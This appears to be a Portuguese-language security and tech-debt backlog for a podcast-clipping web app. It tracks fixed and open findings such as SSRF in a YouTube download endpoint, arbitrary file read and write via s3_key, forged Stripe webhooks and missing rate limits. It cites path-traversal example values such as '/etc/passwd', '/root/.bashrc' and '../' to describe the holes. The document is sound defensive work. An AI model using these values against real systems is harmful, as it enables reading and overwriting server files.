(HIGH — Possível Bug de Reembolso Não Confirmado) O webhook handler em `src/app/api/webhooks/stripe/route.ts` (linhas ~332-335) calcula o valor reembolsado via `charge.refunds.data`. **Suspeita não confirmada**: O objeto `Charge` recebido no payload webhook do Stripe pode **não vir com `refunds` expandido por padrão**, fazendo `refundAmountCents` sempre ser `0`, e a revogação de créditos por reembolso **nunca acontecer de fato na prática**, apesar do código existir e os testes (com payload mockado/expandido manualmente) passarem. Isso só pode ser confirmado com um evento real do Stripe em modo teste — o usuário ainda não configurou os produtos/price IDs no Stripe, então essa verificação fica pendente.
  - Ação recomendada: Antes de confiar nesta feature em produção, disparar um reembolso de teste real no Stripe (modo teste) e confirmar no banco que o crédito foi de fato revogado.

</details>

### Riscos de Configuração e Ambiente

- [x] **(HIGH) Deploy novo no Modal quebraria o LR-ASD (detecção de falante) — RESOLVIDO (2026-10-11)** — `requirements.txt` instalava `scenedetect`, `gdown` e `numpy` sem versão, e o código do submódulo `asd/` (que não editamos) não funciona com as versões atuais: `scenedetect` 0.7.x removeu `scenedetect.video_manager` (0.5.x quebra com o OpenCV atual), `gdown` ≥ 5 removeu a flag `--id` usada para baixar os pesos do detector de rostos, e o NumPy 2 removeu `np.int`. Todas as falhas apareciam só como `FileNotFoundError: Tracks or scores not found for clip` (500 no `/process_video`). Reproduzido localmente, com a `.venv` em `scenedetect 0.5.6`, `gdown 6.2.0` e `numpy 2.0.2`.
  - **Correção:** `scenedetect==0.6.7.1` fixado no `requirements.txt`; novo lançador `ai-podcast-clipper-backend/core/asd_runner.py` (pesos via API Python do `gdown` + shim do `np.int`, sem editar `asd/`); a imagem do Modal baixa o `sfd_face.pth` no build (`main.py`); a mensagem de erro agora traz o exit code do LR-ASD.
  - **Testes:** `tests/test_asd_scene_detection_dependency.py`, `tests/test_asd_runner.py`, `tests/test_active_speaker_detection.py`. Validação ponta a ponta local num trecho de 12s de vídeo real: exit 0, 2 tracks, scores gerados.
  - **Pendente:** validar com `modal deploy` + um processamento real. O build não foi executado nesta sessão; o restante do `requirements.txt` continua sem versão fixa (item "Dependências Python sem versão fixada").

- [x] **(HIGH)** Fila em memória de fallback do Stripe (`stripe-queue.ts`) não tem guard de `NODE_ENV` — **RESOLVIDO (2026-10-11, RNF-IDEM-05)** — se `INNGEST_EVENT_KEY` faltar em produção por engano, reabre o risco de perda de crédito já corrigido na Fase 3 (evento marcado como processado mesmo se a fila em memória falhar).
  - **Arquivo**: `src/infrastructure/queue/stripe-queue.ts` (`enqueue`/`enqueueSubscription`)
  - **Correção:** `assertInMemoryFallbackAllowed` roda antes de qualquer `push` na fila em memória: com `NODE_ENV=production` e sem `INNGEST_EVENT_KEY`, lança; a rota do webhook responde 503 sem marcar o evento como processado e o Stripe reentrega. Primeira camada: `src/env.js` exige `INNGEST_EVENT_KEY`/`INNGEST_SIGNING_KEY` em produção (item "Verificação de assinatura Inngest" abaixo). Dev/test sem a key continuam usando a fila em memória. TDD (RED confirmado antes). Testes: `tests/unit/infrastructure/queue/stripe-queue.production-guard.test.ts` (7 casos), `tests/integration/stripe-webhook-in-memory-queue-production-guard.integration.test.ts` (2 casos: rota real + fila real + Postgres).
  - **Operação:** o harness `scripts/test-everything.sh` (que roda `next start`, ou seja `NODE_ENV=production`) passou a exportar `INNGEST_DEV=1` + `INNGEST_EVENT_KEY` dummy, apontando o app pro Inngest dev server local — senão o webhook do smoke k6 responderia 503.

- [x] **(HIGH) `S3_ENDPOINT_URL` de desenvolvimento (ex.: MinIO em `http://localhost:9000`) configurado por engano em produção — RESOLVIDO (2026-10-11, `RNF-SEC-17`)**.
  - **Frontend — mitigado (2026-10-10):** `src/infrastructure/storage/storage-endpoint-guard.ts::assertStorageEndpointAllowed`, chamado por `src/infrastructure/factories/storage-gateway.factory.ts::createStorageGateway`, falha alto com `NODE_ENV=production` para host `localhost`/loopback/IP privado/link-local, nome interno (`.local`, `.internal`, `.localhost`), nome sem domínio (ex.: `minio`) ou protocolo não-`https:`. Antes do guard, o upload quebrava silenciosamente no browser. Testes: `tests/unit/infrastructure/storage/storage-endpoint-guard.test.ts` e `tests/integration/storage/storage-gateway.factory.production-guard.integration.test.ts` (ambos verdes na execução de 2026-10-10).
  - **Backend — resolvido (2026-10-11):** `ai-podcast-clipper-backend/core/storage/factory.py::create_object_storage` agora valida `S3_ENDPOINT_URL` (branch `"minio"`; `"s3"` nunca aceita endpoint, nada a validar lá) com a mesma regra do frontend — rejeita `localhost`/loopback/IP privado/link-local, nome interno (`.local`/`.internal`/`.localhost`), nome sem domínio (ex.: `minio`) e protocolo não-`https://`, levantando `ValueError` explícito. **Indicador de produção escolhido:** nova env var `APP_ENV` (valores `"development"` default / `"production"`) — o backend não tinha equivalente de `NODE_ENV`; esta é uma decisão nova, documentada em `./modal-secret-checklist.md`, aberta a revisão. TDD (RED confirmado antes da implementação). Testes: `ai-podcast-clipper-backend/tests/test_storage_factory.py::TestProductionEndpointGuard` (18 casos parametrizados: todas as categorias de host inseguro, host público HTTP rejeitado, HTTPS público aceito, `APP_ENV` ausente/`"development"` mantém comportamento de dev) e `::TestProductionEndpointGuardIntegration` (1 caso, sem mock de `boto3.client`, confirma que o guard dispara antes de qualquer tentativa de criar o client). Suíte completa do backend: 320 passed (baseline 257 + este grupo + trabalho concorrente de outro agente no mesmo backend).
  - **Operação:** nunca definir `S3_ENDPOINT_URL` no ambiente de deploy (Vercel/Modal); definir `APP_ENV=production` no secret do Modal (ver `./modal-secret-checklist.md`). Ver também `./minio-dev-local.md`, seção 6.

- **(MEDIUM — configuração do provedor de momentos virais, `RNF-AVAIL-07`)** `MOMENTS_PROVIDER` aceita `gemini` (default) ou `claude`, e cada valor exige a chave do próprio provedor no ambiente de deploy: `GEMINI_API_KEY` para `gemini`, `ANTHROPIC_API_KEY` para `claude`. Valor fora dessas duas opções também falha no startup.
  - **Falha alta:** `MOMENTS_PROVIDER=claude` sem `ANTHROPIC_API_KEY` levanta `ValueError` em `load_model()` (`core/moments_factory.py`), e o processo não sobe. Valor desconhecido também levanta `ValueError`.
  - **Gap conhecido:** `main.py` e `local_server.py` sempre constroem o cliente Gemini com fallback `dummy_key` e o injetam na factory, então a checagem de `GEMINI_API_KEY` não dispara no wiring atual. Chave Gemini ausente só aparece na primeira chamada ao Gemini, em runtime.
  - **Sem failover automático:** trocar de provedor é mudança de configuração e redeploy. Um 503 do Gemini não troca o provedor sozinho.
  - **Validação pendente:** `tests/test_claude_moments.py` usa `MagicMock` para o cliente Anthropic. Antes de usar `MOMENTS_PROVIDER=claude` em produção, rodar um processamento real com uma `ANTHROPIC_API_KEY` de teste e conferir o `MomentsExtraction` devolvido (clipes válidos, timestamps dentro da transcrição, duração 30-60s).
  - **Pendência de configuração:** `ai-podcast-clipper-backend/.env.example` ainda não documenta `MOMENTS_PROVIDER`, `ANTHROPIC_API_KEY` e `CLAUDE_MODEL` (registrado em `progress.md`, 2026-10-11). Configurar a chave como Modal secret, nunca no repositório.

### Riscos de Segurança por Design

- [x] **(HIGH) `local_server.py`: SSRF/injeção de argumento no yt-dlp — RESOLVIDO (2026-10-11, RNF-SEC-06)** — o endpoint `/download_youtube` do runner local chamava `python -m yt_dlp <url>` via `subprocess` sem validar o host, salvava em `/tmp/ai-podcast-clipper/<uuid>.mp4` e devolvia esse caminho local como `s3_key`. Corrigido (decisão do usuário) trocando o atalho de arquivo local pela mesma lógica de produção: `local_server.py::download_youtube` agora chama `core/youtube_downloader.py::download_youtube_to_s3` com o storage plugável (`create_object_storage()`, MinIO em dev). O host é validado por `_assert_youtube_host` antes de qualquer chamada ao yt-dlp, e `YouTubeInvalidHostError` vira **400** nos dois runners (antes, em `main.py`, caía no `except Exception` genérico e virava 500). Erros 404/403/500 seguem o mesmo mapeamento de `main.py`. O `s3_key` devolvido agora é uma chave de storage real (`youtube/<uuid>/original.mp4`), nunca um caminho em `/tmp`. Não há mais `subprocess` em `local_server.py`.
  - **Arquivo**: `ai-podcast-clipper-backend/local_server.py` (`download_youtube`), `main.py` (`download_youtube`, mapeamento 400)
  - **Teste** (RED confirmado antes): `tests/test_local_server.py::TestLocalDownloadYouTube` (HTTP via `TestClient`: 4 URLs SSRF → 400 sem chamar `yt_dlp.YoutubeDL` nem `subprocess.run`; URL válida → `s3_key` de storage; chave gerada no formato do contrato; mapeamento 404/403/500), `tests/test_download_youtube_hardening.py::TestMainDownloadYouTubeHttp::test_non_youtube_host_returns_400_without_invoking_yt_dlp` (4 URLs, `main.download_youtube` montado num app FastAPI) e `test_main_maps_invalid_host_error_to_400_direct_call`.

- [x] **(HIGH) `download_youtube` do Modal aceita bucket E chave S3 arbitrários do chamador autenticado — RESOLVIDO (2026-10-11, RNF-SEC-18)** — quem tivesse o token podia escrever em qualquer bucket alcançável pelas credenciais AWS, inclusive sobrescrever `clips/` de outros usuários.
  - **Arquivo**: `ai-podcast-clipper-backend/core/schemas.py` (`DownloadYouTubeRequest`, `YOUTUBE_S3_KEY_PATTERN`)
  - **Atualização (2026-10-10):** o campo `s3_bucket` foi removido de `DownloadYouTubeRequest`; o bucket agora vem só da config central (`S3_BUCKET_NAME`), então o chamador não escolhe mais o bucket.
  - **Atualização (2026-10-11), chave:** `DownloadYouTubeRequest` agora tem `model_config = ConfigDict(extra="forbid")` (campo desconhecido, inclusive o legado `s3_bucket`, → 422) e `s3_key` (quando enviado) precisa casar com `^youtube/<uuid canônico>/original\.mp4$`. Qualquer outro valor (`clips/...`, `../`, caminho absoluto, `/tmp/...`, `\n` no fim) → 422 antes de qualquer rede/storage. Vale para os dois runners, que usam o mesmo schema. O padrão é um subconjunto estrito de `^youtube/[0-9a-fA-F-]+/original\.mp4$` e aceita o que o frontend gera (`uuidv4()` em `import-youtube-video.use-case.ts`) e o que o backend gera quando a chave é omitida (`uuid.uuid4()`). O frontend (`src/inngest/functions.ts::downloadYouTubeVideo`) deixou de enviar `s3_bucket` no body, que senão daria 422.
  - **Teste** (RED confirmado antes): `tests/test_download_youtube_hardening.py` (schema: 11 chaves inválidas + campo extra; HTTP em `main.download_youtube`: 422 sem chamar `download_youtube_to_s3`), `tests/test_local_server.py::TestLocalDownloadYouTube::test_invalid_s3_key_returns_422_before_any_download` / `test_legacy_s3_bucket_field_returns_422`, frontend `tests/unit/inngest/download-youtube-request-body.test.ts` (body só com `url` e `s3_key`).
  - **Residual conhecido:** um chamador com `AUTH_TOKEN` ainda escolhe *qual* `youtube/<uuid>/original.mp4` escrever. Ele pode sobrescrever a importação de outro usuário se souber o UUID (não enumerável, só via vazamento). O backend não sabe de quem é cada chave. Mitigar de vez exigiria o backend gerar a chave sempre (o frontend já não precisa escolhê-la).

- [x] **(HIGH) `core/video_pipeline.py::resolve_input_video_path` aceitava caminho de arquivo local mesmo em produção — RESOLVIDO (2026-10-11)** — não era exclusivo de dev: se um `s3_key` coincidisse com um caminho existente no container (Modal ou local), o arquivo era copiado para o pipeline em vez de baixado do storage (leitura de arquivo arbitrário, ex.: `s3_key="/etc/passwd"`, para quem tivesse `AUTH_TOKEN`).
  - **Arquivo**: `ai-podcast-clipper-backend/core/video_pipeline.py::resolve_input_video_path` e `ai-podcast-clipper-backend/core/schemas.py::ProcessVideoRequest.s3_key`
  - **Atualização (2026-10-11), parcialmente mitigado:** a única fonte *legítima* de `s3_key` com caminho local foi eliminada. Era o `/download_youtube` do `local_server.py`, que devolvia `/tmp/ai-podcast-clipper/<uuid>.mp4` e o frontend repassava ao `/process_video`. Agora os dois runners devolvem chave de storage (ver item SSRF acima). **Continua aberto:** `ProcessVideoRequest.s3_key` (`core/schemas.py`) não tem validação de formato, então um chamador com `AUTH_TOKEN` ainda pode mandar `s3_key="/etc/passwd"` (ou qualquer arquivo do container) em `/process_video`, e o fallback copia o arquivo para o pipeline. O fallback em si não foi removido (fora do escopo desta tarefa). **Sugestão:** como nenhum fluxo normal depende mais dele, remover o ramo `os.path.exists(s3_key)` (ou confiná-lo a um diretório de dev) e/ou validar o formato de `ProcessVideoRequest.s3_key` (`uploads/...`/`youtube/...`). Antes, conferir com quem usa `tests/test_video_pipeline.py` (testes que preservam o fallback).
  - **Correção (2026-10-11, RNF-SEC-19, TDD com RED confirmado antes):** (1) o ramo `os.path.exists(s3_key)` → `shutil.copy` foi removido; `resolve_input_video_path` sempre chama `storage.download_file(s3_key, base_dir/input.mp4)` (decisão do usuário: o vídeo de entrada sempre vem do storage plugável, S3 em produção e MinIO em dev). (2) `ProcessVideoRequest.s3_key` ganhou `pattern=PROCESS_VIDEO_S3_KEY_PATTERN`: só `youtube/<uuid>/original.mp4` (reaproveita o padrão do RNF-SEC-18) ou `uploads/<userId>/<uuid>/<nome>` (`userId` `[A-Za-z0-9_-]+`, nome `[A-Za-z0-9._-]+` mas nunca `.`/`..`). Caminho absoluto, `../`, `clips/...`, string vazia ou `\n` no fim → 422 nos dois runners, antes de qualquer download/transcrição. Testes: `tests/test_process_video_s3_key_hardening.py` (schema + HTTP em `main.process_video`), `tests/test_video_pipeline.py::TestResolveInputVideoPath` (arquivo existente no disco com o mesmo nome do `s3_key` nunca é copiado), `tests/test_local_server.py::TestLocalProcessVideoS3KeyHardening` (HTTP no `local_server`). Os testes que dependiam do fallback (`pipeline_env`/`_payload_for_local_file` em `tests/test_local_server.py`) passaram a usar uma chave `youtube/<uuid>/original.mp4` servida pelo `FakeObjectStorage`.

- [x] **Escrita de arquivo arbitrário via `LocalObjectStorage.upload_file`/`download_file` (modo `STORAGE_PROVIDER=local`) — RESOLVIDO (2026-10-10)** — a auditoria do storage plugável achou que `shutil.copy(src_path, key)` usava `key` (vinda do `s3_key` do request) sem nenhum confinamento de diretório; um chamador com `AUTH_TOKEN` válido podia mandar `s3_key: "/root/.bashrc"` ou um caminho com `../` e sobrescrever arquivo arbitrário no servidor, no modo `local` (não é o default, que é `s3`). Corrigido com TDD (RED confirmado antes): `LocalObjectStorage` agora exige `root_dir` no construtor e resolve/confina toda `key` dentro dele (`Path.is_relative_to` sobre o caminho *resolvido*, não checagem de substring `".."`), rejeitando caminho absoluto ou que escape do root. `create_object_storage` lê `LOCAL_STORAGE_DIR` (default `/tmp/ai-podcast-clipper-local-storage`) e cria o diretório. O fallback de leitura separado (`resolve_input_video_path`, item acima) não foi tocado, de propósito — continua aberto como item próprio.
  - **Arquivo**: `ai-podcast-clipper-backend/core/storage/local_object_storage.py`, `core/storage/factory.py`
  - **Teste**: `ai-podcast-clipper-backend/tests/test_local_object_storage.py` (11 testes, incluindo rejeição de caminho absoluto e de escape via `../` tentando escapar de verdade), `tests/test_storage_factory.py::TestLocalProviderStorageRoot` (2 testes). Suíte completa: 241 passed (sem filtro de marker), 238 passed/3 deselected (`-m "not minio"`), 3 passed (`-m "minio"`).

- **(NICE/Confirmar)** Divergência de modelo Gemini: AGENTS.md e documentação citam "Gemini 2.5 Pro", código usa `gemini-2.5-flash` como default (`core/moments.py:48`). Confirmar se é intencional (decisão de custo deliberada, ou desalinhamento).
  - **Arquivo**: `ai-podcast-clipper-backend/core/moments.py:48`

- [x] **(HIGH, Reforça Item Existente) Endpoint de debug `/api/dev-sign-stripe-payload` — RESOLVIDO (2026-10-11, RNF-SEC-10)** — ainda acessível fora de produção, permitia forjar webhooks Stripe válidos. Precisão sobre a causa: o `clerkMiddleware` (`src/middleware.ts`) até roda em `/(api|trpc)(.*)`, mas só protege `/dashboard(.*)` (`isProtectedRoute`), então a rota ficava pública e sem auth em qualquer ambiente com `NODE_ENV !== "production"` (preview/staging). É o **mesmo problema** do item HIGH → Segurança "Endpoint de debug Stripe ainda em produção" (fechados juntos). Corrigido removendo o endpoint (decisão do usuário: remover, não desabilitar). A assinatura de payloads de teste do experimento de observabilidade passou para `ai-podcast-clipper-frontend/scripts/sign-stripe-test-payload.js` (offline, `stripe.webhooks.generateTestHeaderString`, não sobe com o app).
  - **Arquivo removido**: `src/app/api/dev-sign-stripe-payload/route.ts`
  - **Teste**: `tests/integration/dev-sign-stripe-payload-removed.test.ts` (HTTP real: POST/GET → 404, sem header assinado na resposta; RED confirmado antes: POST devolvia o header, GET 405), `tests/unit/scripts/sign-stripe-test-payload.test.ts` (header aceito por `constructEvent`, segredo errado rejeitado, modo test/não-test, segredo ausente falha, saída sem segredos, diretório da rota inexistente).

### Pendências abertas da auditoria de segurança (2026-10-09)

Encontradas na auditoria que fechou o RCE via `preset` (acima). Não foram corrigidas nesta rodada.

- [ ] **(MÉDIA — funcional) Preset `NONE` ("Sem Legenda") não tem implementação no backend** — o usuário escolhe "Sem Legenda" (`ai-podcast-clipper-frontend/src/components/dashboard/create-project-client.tsx:540`) e o contrato aceita `NONE` (`ai-podcast-clipper-backend/core/schemas.py`), mas `core/subtitle_styles.py::SUPPORTED_PRESETS` não o contém. `get_preset_style` imprime um aviso e cai para HORMOZI, então o clipe sai com legenda HORMOZI.  
  **Ação:** tratar `NONE` como "sem queima de legenda" no pipeline (`core/subtitles.py`, `core/clip_pipeline.py`) e cobrir com teste que confirme a ausência de legenda no resultado.  
  **Origem:** auditoria de segurança (2026-10-09), ao validar a allowlist de `preset`.

- [ ] **(MÉDIA — funcional) Projetos antigos com `subtitlePreset` fora da allowlist recebem 422 no retry** — antes desta correção, a validação só limitava o tamanho do preset (50 caracteres). Um projeto salvo com valor fora da lista chega ao `src/application/use-cases/retry-project.use-case.ts` (`preset: updated.subtitlePreset || "HORMOZI"`) e o backend responde 422.  
  **Ação:** decidir entre (a) normalizar ou migrar os dados legados no banco ou (b) fallback explícito no retry com log; cobrir com teste.  
  **Origem:** auditoria de segurança (2026-10-09).

- [x] **Cinco outras chamadas `subprocess.run(..., shell=True)` com string montada no backend — AUDITADO (2026-10-09), sem ação necessária** — `core/clip_pipeline.py:73` e `:79`, `core/vertical_video.py:144`, `core/transcription.py:61`, `core/active_speaker_detection.py:43`. Auditoria lendo o código de cada ponto e de seus chamadores: todas interpolam apenas valores internos ao pipeline — caminhos gerados com `uuid4` (`/tmp/<uuid>`, `input.mp4`, `clip_{index}`, `audio.wav`), índice inteiro, `start`/`end` como `float` validados pelo Pydantic (`ClipItem`/`ManualCut`) e configuração do operador (`asd_dir`). Nenhuma recebe dado do usuário sem sanitização. `s3_key` não entra em nenhum comando de shell.  
  **Ressalva:** migrar para lista de argumentos com `shell=False` continua sendo defesa em profundidade válida no futuro, mas não é urgente.  
  **Fora do escopo:** `ai-podcast-clipper-backend/asd/` (clone externo, ver `AGENTS.md`) também usa `shell=True`.  
  **Origem:** auditoria de segurança (2026-10-09).

- [x] **(BAIXA — a verificar) `s3_key` aceita caminho local no backend — RESOLVIDO (2026-10-11)** — `core/video_pipeline.py::resolve_input_video_path` faz `os.path.exists(s3_key)` e, se existir, `shutil.copy(s3_key, ...)`; só caso contrário baixa do S3. Ou seja, um `s3_key` que seja caminho de arquivo do container é copiado para o pipeline. Não é injeção de shell (o valor não entra em comando), mas é leitura de arquivo arbitrário do container se um chamador autenticado controlar `s3_key`. **Pendente:** verificar se o frontend ou algum fluxo permite ao usuário definir `s3_key` livremente (hoje não verificado) e, se não for necessário para desenvolvimento local, restringir o fallback de caminho local a um diretório permitido ou removê-lo.  
  **Atualização (2026-10-11):** o fluxo normal não gera mais `s3_key` com caminho local. O `/download_youtube` do `local_server.py`, que era a única fonte, agora devolve chave de storage. O fallback de desenvolvimento local deixou de ter uso legítimo. **Continua aberto**, porque `ProcessVideoRequest.s3_key` segue sem validação de formato e um chamador com `AUTH_TOKEN` ainda alcança o fallback. Detalhes e sugestão em "Riscos de Segurança por Design" → `resolve_input_video_path`.  
  **Resolvido (2026-10-11, RNF-SEC-19):** fallback removido de `core/video_pipeline.py::resolve_input_video_path` e formato de `ProcessVideoRequest.s3_key` validado em `core/schemas.py` (`PROCESS_VIDEO_S3_KEY_PATTERN`). Verificado no frontend: as únicas origens de `s3_key` enviadas ao `/process_video` são `generate-upload-url.use-case.ts` (`uploads/<userId>/<uuid>/<nome>`) e `import-youtube-video.use-case.ts`/resposta do `/download_youtube` (`youtube/<uuid>/original.mp4`). Testes e detalhes em "Riscos de Segurança por Design" → `resolve_input_video_path`.  
  **Origem:** leitura do código durante a auditoria do `shell=True` (2026-10-09).

- **Atualizado em 2026-10-09:** comparação do Bearer token não constant-time (RNF-SEC-07) foi corrigida; ver o item resolvido em HIGH → Infraestrutura.

---

## HIGH — Correção Urgente Antes de Produção

Estes itens impactam segurança, confiabilidade ou experiência crítica; recomenda-se correção antes de go-live.

### Segurança

- [ ] **Rate limiting nos endpoints do backend Python** — Endpoints `/process_video` e `/download_youtube` (`ai-podcast-clipper-backend/main.py`) não possuem throttling (slowapi/Limiter) — abusáveis para consumir GPU sem limite. Bearer token estático é único controle (sem limite de tentativas). **Prioridade P0 (custos GPU elevados).** *(Incorporado de OWASP ASVS V11)*

- [ ] **Rate limiting in-memory não funciona em serverless** — `src/infrastructure/rate-limiting/in-memory-sliding-window-rate-limiter.ts:16` usa estrutura residente na memória, reiniciada a cada cold start serverless — proteção inefetiva.

- [ ] **CSP (Content Security Policy) — PARCIAL (2026-10-11): Report-Only ativo, falta validação ao vivo e decisão de enforce (não marcar como resolvido até a troca pra enforce)** — `next.config.js` agora envia `Content-Security-Policy-Report-Only` (não `Content-Security-Policy`) em todas as rotas, com a política construída em `content-security-policy.config.js` (diretivas mínimas `default-src 'self'`, `object-src 'none'`, `frame-ancestors 'self'`, `base-uri 'self'`, `form-action 'self'`, mais as exceções de domínio levantadas lendo o código: Clerk em `script-src`/`connect-src`/`frame-src` (`*.clerk.accounts.dev`) e `img-src` (`img.clerk.com`), miniaturas do YouTube (`i.ytimg.com`), imagens da landing (`images.unsplash.com`), S3/MinIO em `media-src`/`img-src` (`*.amazonaws.com` + a origem de `S3_ENDPOINT_URL` quando configurado, para não gerar ruído em dev com MinIO)).
  **Por que Report-Only e não enforce:** Report-Only só reporta violações no DevTools do browser, sem bloquear nenhum carregamento — zero risco de quebrar login/checkout/player em produção só com esta mudança. Enforce (`Content-Security-Policy`) é deliberadamente **não** ativado aqui.
  **Verificado lendo o código (não suposto):** não há domínio Stripe na política porque `createCheckoutSession`/`createCustomerPortalSession` (`src/actions/stripe.ts`) fazem `redirect(sessionUrl)` — navegação de página inteira para o Stripe, não iframe/script embutido (`@stripe/stripe-js`/`loadStripe`/`<Elements>` não aparecem em `src/`). Se isso mudar no futuro (Stripe Elements embutido), a CSP precisa ser revisada.
  **Pendente — próximo passo manual do usuário, não decidido aqui:** validar ao vivo em staging, com chave Clerk real (hoje só há chave de dev, ver item "Chave Clerk de produção não configurada" abaixo): (1) login/signup incluindo Google OAuth, (2) checkout e portal do Stripe, (3) reprodução de clipe. Só depois dessa validação, trocar `Content-Security-Policy-Report-Only` por `Content-Security-Policy` em `next.config.js` — decisão e execução do usuário.
  **Testes:** `tests/unit/next-config.test.ts` (política mínima + domínios + guard de que nunca vira enforce por engano), `tests/integration/security-headers-csp.integration.test.ts` (header real na resposta HTTP).
  **Origem:** frontend-specialist (2026-10-11).

- [x] **RESOLVIDO** ~~**Rate limit ausente em actions de projeto e billing** — `deleteProjectAction`, `renameProjectAction`, `retryProjectAction`, `createCheckoutSession`, `createCustomerPortalSession` sem rate limiting — potencial para abuse (ex: gerar sessões Stripe em loop). **Prioridade P1.** *(Incorporado de OWASP ASVS V11)*~~ **Corrigido (2026-10-11):** `deleteProjectAction`, `renameProjectAction` e `retryProjectAction` (`src/actions/projects-actions.ts`) agora aplicam `makeProjectActionRateLimiter()` (20 req/min por usuário); `createCheckoutSession` e `createCustomerPortalSession` (`src/actions/stripe.ts`) agora aplicam `makeBillingActionRateLimiter()` (5 req/min por usuário, limite compartilhado entre as duas — evita loop de criação de sessões Stripe). Ambos os novos singletons em `src/infrastructure/factories/rate-limiter-factory.ts` (mesmo padrão de `InMemorySlidingWindowRateLimiter` já usado por `makeYouTubeImportRateLimiter`/`makeUploadUrlRateLimiter`), guard logo após resolver `userId`, lançando `RateLimitExceededError` acima do limite — nas actions de projeto isso é capturado e devolvido como `{ success: false, error: "Too many requests..." }` (mesmo formato dos demais erros dessas actions); nas de billing, propaga como exceção (mesmo padrão de `Unauthorized`/`DomainError` já usado lá). **Testes:** `tests/unit/actions/projects-actions-rate-limit.test.ts`, `tests/unit/actions/stripe-actions-rate-limit.test.ts`, `tests/integration/actions/projects-actions-rate-limit.integration.test.ts`, `tests/integration/actions/stripe-actions-rate-limit.integration.test.ts`.

- [ ] **Fluxo de exclusão de conta incompleto** — Usuário não pode deletar conta via UI; webhook Clerk (`src/app/api/webhooks/clerk/route.ts:92-105`) não limpa S3 nem cancela Stripe subscription.

- [ ] **IDOR em `DELETE /api/local-storage`** — `src/app/api/local-storage/route.ts:181-208` não valida propriedade do arquivo sendo deletado. GET/PUT possuem `isOwnedByUser()`, mas DELETE não.

- [x] **RESOLVIDO** ~~**`/api/youtube/info` sem autenticação e rate limit** — `src/app/api/youtube/info/route.ts:4-75` exposto publicamente, faz fetch outbound sem limite — abusável para flood de requisições.~~ **Corrigido (2026-10-11):** o `GET` agora exige sessão via `makeAuthGateway().getUserId()` (401 `Unauthorized` sem sessão Clerk, sem disparar nenhum fetch outbound) e aplica `makeYouTubeInfoRateLimiter()` — novo singleton em `src/infrastructure/factories/rate-limiter-factory.ts` (20 req/min por usuário, mais permissivo que o limite de import de 5/min, já que é só leitura de metadata). Acima do limite: 429 `Too many requests`. O único consumidor (`CreateProjectClient.handleFetchMeta`, área `/dashboard` já protegida por `src/middleware.ts`) continua funcionando sem alteração de UI — os dois novos estados de erro já caem no tratamento de toast existente. **Decisão registrada:** não consolidado com a duplicação em `src/actions/youtube-info.ts` (Server Action usada só em `app/dashboard/new/page.tsx`, um Server Component já dentro da rota protegida `/dashboard(.*)` — não é um endpoint publicamente alcançável como a rota de API, então não carrega a mesma vulnerabilidade; a consolidação fica para uma tarefa futura de redução de duplicação). **Testes:** `tests/unit/api/youtube-info-route.test.ts`, `tests/integration/api/youtube-info-route.integration.test.ts`.

- [ ] **Dependências Python sem versão fixada** — `ai-podcast-clipper-backend/requirements.txt` sem pinning exato (ex.: `whisperx>=0.10.0` em vez de `whisperx==0.10.2`).

- [x] **Dependências npm com vulnerabilidades críticas/high (resolvido no gate de CI — 0 em produção; resíduo de 5 high em devDependencies aceito, ver abaixo)** — `fast-xml-parser`, `sharp`, `path-to-regexp`, `@grpc/grpc-js` reportados por npm audit.
  **Evidência:** `npm audit` antes (2026-10-08): 50 vulnerabilidades (3 low, 25 moderate, 20 high, 2 critical). Depois de `npm audit fix` (sem `--force`): 7 (1 moderate, 6 high, **0 critical**). Depois do upgrade para Next 16.4.0 e da migração do lint (2026-10-08): `npm audit --audit-level=high --omit=dev` retorna **0 vulnerabilidades** (exit 0) e é o comando agora usado no CI (`.github/workflows/ci.yml`, step "Audit dependencies (fail on high/critical, production deps only)"). `npm audit` completo (inclui devDependencies) retorna 5 high, todas na cadeia `eslint-config-next` → `@next/eslint-plugin-next` → `fast-glob` → `micromatch` → `braces`.
  **Origem:** devops-specialist
  **Resolvido (parte segura):**
  - As 2 vulnerabilidades **critical** (`fast-xml-parser` via `@aws-sdk/client-s3`/`@aws-sdk/s3-request-presigner`, e `proxy-addr` transitiva) e todas as **high** de devDependencies (`ajv`, `qs`, `uuid`, `flatted`, `source-map-js`, `@eslint/plugin-kit`, `@humanfs/node`, `@smithy/config-resolver`, `@grpc/grpc-js`, `@modelcontextprotocol/sdk`, `brace-expansion`, `js-yaml`, `minimatch`, `path-to-regexp`, `@typescript-eslint/*`) foram resolvidas só com `npm audit fix`, sem `--force` — o AWS SDK v3 resolveu para `3.1148.0` dentro do range já declarado em `package.json` (`^3.806.0`/`^3.808.0`, sem bump manual nem mudança de API), que não depende mais de `fast-xml-parser` (passou a usar `@aws-sdk/xml-builder`). Só `package-lock.json` mudou (`package.json` intacto). Confirmado: `npm ls fast-xml-parser` vazio, `npm ls @aws-sdk/client-s3` → `3.1148.0`.
  - Testes relacionados a storage/S3 (`tests/unit/s3-action.test.ts`, `tests/unit/actions/s3-upload-rate-limit.test.ts`, suíte unitária completa) passam sem alteração de código em `src/infrastructure/storage/s3-storage.gateway.ts` (único arquivo de produção que importa `@aws-sdk/*`).
  **Decisão e mitigação (2026-10-08):**
  - `postcss` (high) deixou de aparecer: foi resolvido pelo upgrade de `next` 15.5.27 → **16.4.0** (com `eslint-config-next` 16.4.0 no mesmo major).
  - Resíduo de 5 high, 100% devDependency: `braces` (GHSA-vfj7-8cjw-p6xm, sem versão corrigida publicada até a data da verificação) e a cadeia que depende dele (`micromatch`, `fast-glob`, `@next/eslint-plugin-next`, `eslint-config-next`). `npm ls --omit=dev` não retorna nada para essa cadeia, e `package.json` só a lista em `devDependencies`. Por decisão do usuário, o CI audita só dependências de produção (`npm audit --audit-level=high --omit=dev`). Verificado por `security-specialist`: não há exposição em produção.
  - Não foi aplicado `npm audit fix --force` (que faria downgrade de `eslint-config-next` para 14.2.35). Reabrir este item assim que existir patch para `braces`, ou se a cadeia passar a ser dependência de produção.

- [x] **Verificação de assinatura Inngest sem validação central — RESOLVIDO (2026-10-11, RNF-SEC-04)** — Dependia de env vars não validadas em schema Zod; podia cair pra default insegura.
